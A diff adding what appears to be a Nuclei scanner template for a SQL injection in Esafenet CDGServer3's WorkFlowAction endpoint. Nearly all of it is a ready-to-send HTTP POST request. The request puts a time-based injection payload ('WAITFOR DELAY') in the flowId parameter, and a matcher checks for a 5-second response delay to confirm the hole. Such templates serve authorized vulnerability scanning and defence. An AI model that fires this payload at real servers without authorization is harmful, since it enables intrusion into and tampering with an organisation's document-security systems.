@@ -1,0 +1,38 @@
+id: esafenet-cdgserver3-WorkFlowAction-sqli
+info:
+  name: 亿赛通 WorkFlowAction SQL 注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/%E4%BA%BF%E8%B5%9B%E9%80%9A/%E4%BA%BF%E8%B5%9B%E9%80%9A%20WorkFlowAction%20SQL%20%E6%B3%A8%E5%85%A5.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,esafenet
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /CDGServer3/3g/WorkFlowAction;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Language: zh-CN,zh;q=0.9
+
+        command=Approval&userId=1&fromurl=getTodoList.jsp?curpage=111&flowId=111'%3bWAITFOR+DELAY+'0%3a0%3a5'-- 
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+        condition: and
